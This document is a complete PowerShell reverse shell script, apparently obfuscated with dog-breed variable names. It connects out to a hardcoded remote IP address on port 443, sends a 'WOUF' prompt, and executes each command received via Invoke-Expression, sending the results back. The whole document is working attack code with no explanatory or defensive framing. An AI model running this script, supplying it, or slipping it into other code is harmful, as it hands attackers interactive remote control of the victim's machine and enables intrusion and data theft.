function Roll 
{    
    try 
    {
        $beagle = New-Object System.Net.Sockets.TCPClient("57.129.15.70",443)
        $goldenRetriever = $beagle.GetStream()
        [byte[]]$dalmatian = 0..65535 | % {0}

        $poodle = ([text.encoding]::ASCII).GetBytes('WOUF ' + (Get-Location).Path + '>')
        $goldenRetriever.Write($poodle,0,$poodle.Length)

        while(($bulldog = $goldenRetriever.Read($dalmatian, 0, $dalmatian.Length)) -ne 0)
        {
            $doberman = New-Object -TypeName System.Text.ASCIIEncoding
            $chihuahua = $doberman.GetString($dalmatian,0, $bulldog)
            try
            {
                $shibaInu = (Invoke-Expression -Command $chihuahua 2>&1 | Out-String)
            }
            catch
            {
                Write-Error $_
            }
            $borderCollie  = $shibaInu + 'WOUF ' + (Get-Location).Path + '> '
            $corgi = ($error[0] | Out-String)
            $error.clear()
            $borderCollie = $borderCollie + $corgi

            # Send response
            $rottweiler = ([text.encoding]::ASCII).GetBytes($borderCollie)
            $goldenRetriever.Write($rottweiler,0,$rottweiler.Length)
            $goldenRetriever.Flush()  
        }
        $beagle.Close()
        if ($saintBernard)
        {
            $saintBernard.Stop()
        }
    }
    catch
    {
        Write-Error $_
    }
}

Roll
